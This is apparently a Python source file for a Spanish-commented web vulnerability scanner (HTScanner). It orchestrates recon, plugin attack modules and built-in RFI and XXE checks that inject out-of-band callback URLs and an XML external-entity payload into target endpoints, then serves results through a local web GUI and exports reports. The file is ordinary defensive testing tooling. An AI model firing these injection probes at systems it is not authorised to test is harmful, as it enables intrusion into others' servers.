    def run_jsecret(c):
        js = (getattr(c, "_crawl", {}) or {}).get("js_files", set())
        if not js:
            c.emit({"type": "module", "name": "jsecret", "status": "done",
                    "msg": "JS Analyzer: sin archivos .js para analizar"})
            return
        secrets = jsecret.analyze_js(c, js)
        uniq = set((s[0], s[1]) for s in secrets)
        c.emit({"type": "module", "name": "jsecret", "status": "done",
                "msg": f"JS Analyzer: {len(uniq)} secreto(s) potencial(es)", "findings": [f"{s[0]}" for s in secrets]})

    recon_runners["tech"] = run_fingerprint
    recon_runners["crawler"] = run_crawler
    recon_runners["archivos"] = run_discovery
    recon_runners["jsecret"] = run_jsecret

    # ---- modulos de ataque (plugins + internos rfi/xxe) ----
    attack_runners = {}
    plugins = engine.load_plugins()
    for pname, pmod in plugins.items():
        attack_runners[pname] = lambda c, m=pmod: m.run(c)

    # RFI / XXE (OOB) integrados
    def run_rfi(c):
        oob_host, oob_port, oob_token = c.start_oob()
        cb = f"http://{oob_host}:{oob_port}/{oob_token}.txt"
        hits = []
        for rt in ["/include", "/?inc", "/index.php"]:
            base = target.rstrip("/") + rt
            for param in ["url", "file", "page", "path", "inc"]:
                if c.ctrl("rfi") in ("stop", "skip"):
                    break
                rr = c.req("GET", base, {param: cb}, timeout=5)
                if c.wait_oob("rfi", 1.2):
                    hits.append(f"{rt or '/'}{param}")
                    c.emit({"type": "finding", "severity": "high", "module": "rfi",
                            "detail": f"RFI OOB en '{base}' param '{param}': el servidor intento cargar {cb}",
                            "evidence": {"url": base, "param": param, "callback": cb}})
                    break
        c.stop_oob()
        c.emit({"type": "module", "name": "rfi", "status": "done",
                "msg": f"RFI: {len(hits)} (OOB)", "findings": hits})

    def run_xxe(c):
        oob_host, oob_port, oob_token = c.start_oob()
        payload = (f'<?xml version="1.0"?>'
                   f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_host}:{oob_port}/{oob_token}">]>'
                   f'<foo>&xxe;</foo>')
        hits = []
        for ep in ["/", "/xml", "/api/xml", "/soap", "/upload"]:
            if c.ctrl("xxe") in ("stop", "skip"):
                break
            c.req("POST", target.rstrip("/") + ep, data=payload, raw=True, timeout=5)
            if c.wait_oob("xxe", 1.2):
                hits.append(ep or "/")
                c.emit({"type": "finding", "severity": "high", "module": "xxe",
                        "detail": f"XXE OOB en '{ep or '/'}' (el parser solicito recurso externo)",
                        "evidence": {"endpoint": ep}})
                break
        c.stop_oob()
        c.emit({"type": "module", "name": "xxe", "status": "done",
                "msg": f"XXE: {len(hits)} (OOB)", "findings": hits})

    attack_runners["rfi"] = run_rfi
    attack_runners["xxe"] = run_xxe

    if templates:
        def run_nuclei(c):
            run_nuclei_templates(scan_id, target, templates, bus, c.emit)
        attack_runners["nuclei"] = run_nuclei

    # ---- perfil: selecciona modulos (recon + ataque) ----
    from core.profiles import resolve_modules
    recon_order, attack_sel, prof_mode = resolve_modules(profile, list(plugins.keys()))
    # el perfil puede forzar modo (ej. passive)
    if prof_mode == "passive":
        mode = "passive"
    ctx.emit({"type": "profile", "name": profile,
              "desc": __import__("core.profiles", fromlist=["list_profiles"]).list_profiles().get(profile, ""),
              "recon": recon_order, "attack": attack_sel, "mode": mode})
    # ataque: plugins del perfil + los runners internos (rfi/xxe/nuclei)
    attack_order = list(attack_sel)
    for internal in ("rfi", "xxe"):
        if internal in attack_runners and internal not in attack_order:
            attack_order.append(internal)
    if templates and "nuclei" not in attack_order:
        attack_order.append("nuclei")

    total = len(recon_order) + len(attack_order)
    for i in recon_order:
        ctx.set_total(total)
    # ejecutar recon en paralelo
    engine.run_modules(ctx, recon_order, recon_runners)

    # Si el crawler descubrio parametros/endpoints, se podrian usar para enriquecer
    # los modulos de ataque (ya usan rutas por defecto + las del crawler via _crawl).

    # ejecutar ataque en paralelo
    engine.run_modules(ctx, attack_order, attack_runners)

    # ---- priorizacion + correlacion + cadenas + sugerencias ----
    findings = ctx._report["findings"]
    corr = risk.correlate(findings)
    for c in corr:
        ctx.emit({"type": "finding", "severity": c["severity"], "module": c["module"],
                  "detail": c["detail"], "evidence": c.get("evidence", {})})
        findings.append(c)
    # grafo de correlacion: cadenas de ataque
    chains = risk.attack_chains(findings, getattr(ctx, "_fingerprint", {}))
    for ch in chains:
        ctx.emit({"type": "finding", "severity": ch["severity"], "module": ch["module"],
                  "detail": ch["detail"], "evidence": ch.get("evidence", {})})
        findings.append(ch)
    if chains:
        ctx.emit({"type": "chain", "chains": [c["detail"] for c in chains]})
    sug = risk.suggest(findings, getattr(ctx, "_fingerprint", {}))
    ctx.emit({"type": "ai", "suggestions": sug})

    # ---- reporte final ----
    try:
        ctx._report["target"] = target
        ctx._report["fecha"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        ctx._report["mode"] = mode
        ctx._report["modulos"] = total
        ctx._report["correlations"] = corr
        ctx._report["suggestions"] = sug
        # ordenar hallazgos por severidad
        ctx._report["findings"] = risk.sort_findings(findings)
        pdf_path = os.path.join(REPORTS_DIR, f"{scan_id}.pdf")
        pdfgen.generate_report(ctx._report, pdf_path)
        # formatos adicionales
        base = os.path.splitext(pdf_path)[0]
        with open(base + ".json", "w") as f:
            f.write(exporters.to_json(ctx._report))
        with open(base + ".md", "w") as f:
            f.write(exporters.to_markdown(ctx._report))
        with open(base + ".html", "w") as f:
            f.write(exporters.to_html(ctx._report))
        with open(base + ".nuclei.yaml", "w") as f:
            f.write(exporters.to_nuclei_templates(ctx._report))
        with open(base + ".burp", "w") as f:
            f.write(exporters.to_burp(ctx._report))
        ctx.emit({"type": "report", "path": pdf_path,
                  "msg": f"Reporte PDF generado: {os.path.basename(pdf_path)}",
                  "formats": ["pdf", "json", "md", "html", "nuclei.yaml", "burp"]})
        # ---- persistencia SQLite (comparar escaneos) ----
        try:
            from core.db import save_scan, diff_with_previous
            fp = getattr(ctx, "_fingerprint", {}) or {}
            techs = [{"nombre": t, "version": (fp.get("versions") or {}).get(t, "")}
                     for t in fp.get("tech", [])]
            apis = sorted((getattr(ctx, "_crawl", {}) or {}).get("apis", []))
            riesgo = risk.risk_level(ctx._report["findings"])
            duracion = round(time.time() - t0, 1)
            save_scan(scan_id, target, mode, riesgo,
                      ctx._report["findings"], techs=techs, apis=apis, duracion=duracion)
            # comparar con escaneo previo del mismo objetivo
            diff = diff_with_previous(scan_id)
            if diff:
                ctx.emit({"type": "diff", "data": diff})
        except Exception as e:
            ctx.emit({"type": "log", "msg": f"No se pudo persistir en DB: {e}", "level": "warn"})
    except Exception as e:
        ctx.emit({"type": "error", "msg": f"No se pudo generar el reporte: {e}"})

    from core.control import STORE
    STORE.drop(scan_id)

    ctx.emit({"type": "done", "target": target,
              "summary": f"Escaneo completado. Modulos: {total}. Hallazgos: {len(findings)}."})


class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=ROOT, **k)

    def do_GET(self):
        if self.path.startswith("/api/report?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            scan_id = params.get("scan_id", [""])[0]
            fmt = params.get("fmt", ["pdf"])[0]
            ext_map = {"pdf": "pdf", "json": "json", "md": "md", "html": "html",
                       "nuclei": "nuclei.yaml", "nuclei.yaml": "nuclei.yaml", "burp": "burp"}
            ext = ext_map.get(fmt, "pdf")
            path = os.path.join(REPORTS_DIR, f"{scan_id}.{ext}")
            if os.path.exists(path):
                with open(path, "rb") as f:
                    data = f.read()
                ctype = "application/pdf" if ext == "pdf" else (
                    "application/json" if ext == "json" else
                    "text/html" if ext == "html" else "text/plain")
                self.send_response(200)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Disposition",
                                 f'attachment; filename="HTScanner_{scan_id}.{ext}"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
            return

        if self.path.startswith("/api/scan?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            target = params.get("target", [""])[0]
            scan_id = str(uuid.uuid4())[:8]
            # El estado del scan se registra dentro de scan_target via STORE.create()
            # (core.control). No guardamos estado global aqui.
            # Cargar plantillas YAML si se pasan por ?templates=<contenido urlencoded>
            templates = None
            raw = params.get("templates", [""])[0]
            if raw:
                templates = load_templates_from_yaml(urllib.parse.unquote(raw))
            # Cargar payloads .txt si se pasan por ?payloads=<contenido urlencoded>
            payloads = None
            praw = params.get("payloads", [""])[0]
            if praw:
                payloads = load_payloads_from_txt(urllib.parse.unquote(praw))
            # Perfil de escaneo (selecciona plugins)
            profile = params.get("profile", ["full"])[0]
            # Modo activo/pasivo (el perfil puede sobreescribirlo)
            mode = params.get("mode", ["active"])[0]
            if mode not in ("active", "passive"):
                mode = "active"
            # Auth opcional (login para escanear tras autenticacion)
            auth = None
            auth_raw = params.get("auth", [""])[0]
            if auth_raw:
                try:
                    auth = json.loads(urllib.parse.unquote(auth_raw))
                except Exception:
                    auth = None
            # Concurrencia
            try:
                concurrency = int(params.get("concurrency", ["4"])[0])
            except Exception:
                concurrency = 4
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.send_header("Connection", "keep-alive")
            self.end_headers()

            def bus(ev):
                try:
                    self.wfile.write(f"data: {json.dumps(ev)}\n\n".encode())
                    self.wfile.flush()
                except Exception:
                    pass

            # Emitir el scan_id para que el frontend pueda enviar controles
            try:
                self.wfile.write(f"data: {json.dumps({'type': 'scan_id', 'scan_id': scan_id})}\n\n".encode())
                self.wfile.flush()
            except Exception:
                pass

            try:
                scan_target(scan_id, target, bus, templates, payloads, mode,
                            auth=auth, concurrency=concurrency, profile=profile)
            except Exception as e:
                bus({"type": "error", "msg": str(e)})
            try:
                self.wfile.write(b"event: end\ndata: {}\n\n")
                self.wfile.flush()
            except Exception:
                pass
            # STORE.drop(scan_id) ya se hace dentro de scan_target al terminar.
            return

        if self.path.startswith("/api/control?"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            scan_id = params.get("scan_id", [""])[0]
            action = params.get("action", [""])[0]
            mod = params.get("module", [""])[0]
            from core.control import STORE
            if action in ("pause", "resume", "stop"):
                STORE.set_action(scan_id, action)
                ok = True
            elif action == "skip" and mod:
                STORE.skip(scan_id, mod)
                ok = True
            else:
                ok = STORE._scans.get(scan_id) is not None
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"ok": ok, "scan_id": scan_id, "action": action}).encode())
            return

        # ---- API REST de lectura (historial, comparacion) ----
        if self.path.startswith("/api/scans"):
            from core.db import get_scans
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"scans": get_scans()}).encode())
            return
        if self.path.startswith("/api/scan/"):
            sid = self.path.split("/api/scan/", 1)[1].split("?")[0]
            from core.db import get_scan, diff_with_previous
            rec = get_scan(sid)
            if rec is None:
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(rec).encode())
            return
        if self.path.startswith("/api/compare"):
            qs = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(qs)
            a = params.get("a", [""])[0]
            b = params.get("b", [""])[0]
            from core.db import compare_scans
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(compare_scans(a, b) or {}).encode())
            return

        return super().do_GET()

    def do_POST(self):
        # Permite subir el YAML por POST (mas limpio que por URL)
        if self.path == "/api/templates":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8", "replace")
            templates = load_templates_from_yaml(body)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"ok": True, "templates": len(templates)}).encode())
            return
        return super().do_POST()


def run():
    print(f"[*] ht_scanner GUI en http://127.0.0.1:{PORT}")
    if not HAS_YAML:
        print("[!] PyYAML no instalado: el modulo Nuclei/YAML no estara disponible.")
        print("    Instala con: pip install pyyaml")
    # ThreadingHTTPServer: cada conexion en su propio hilo (SSE no bloquea otras)
    HTTPServer.allow_reuse_address = True
    srv = ThreadingHTTPServer(("127.0.0.1", PORT), Handler)
    srv.serve_forever()


if __name__ == "__main__":
    run()
